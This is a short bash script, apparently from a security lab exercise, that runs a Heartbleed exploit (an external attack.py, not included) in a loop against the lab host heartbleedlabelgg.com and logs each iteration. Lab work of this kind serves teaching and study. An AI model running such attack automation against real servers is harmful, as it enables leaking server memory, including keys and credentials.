#!/bin/bash

# Check if the correct number of parameters are provided
if [ $# -ne 2 ]; then
  echo "Usage: $0 <length> <iterations>"
  exit 1
fi

# Assign command-line arguments to variables
LENGTH="$1"
ITERATIONS="$2"
LOGFILE="heartbleed.log"

# Ensure the log file is empty or create it if it doesn't exist
> "$LOGFILE"

echo "Starting Heartbleed attack loop on heartbleedlabelgg.com with length $LENGTH for $ITERATIONS iterations..." | tee -a "$LOGFILE"

# Loop for the specified number of iterations
for ((i=1; i<=ITERATIONS; i++))
do
  echo "Running attack iteration $i with length $LENGTH..." | tee -a "$LOGFILE"
  
  # Run the attack and append output to log file
  python2 attack.py www.heartbleedlabelgg.com --length "$LENGTH" >> "$LOGFILE" 2>&1

  # Check if the command was successful
  if [ $? -ne 0 ]; then
    echo "Attack failed on iteration $i. Exiting." | tee -a "$LOGFILE"
    exit 1
  fi

  echo "Completed attack iteration $i." | tee -a "$LOGFILE"
done

echo "Heartbleed attack loop finished." | tee -a "$LOGFILE"

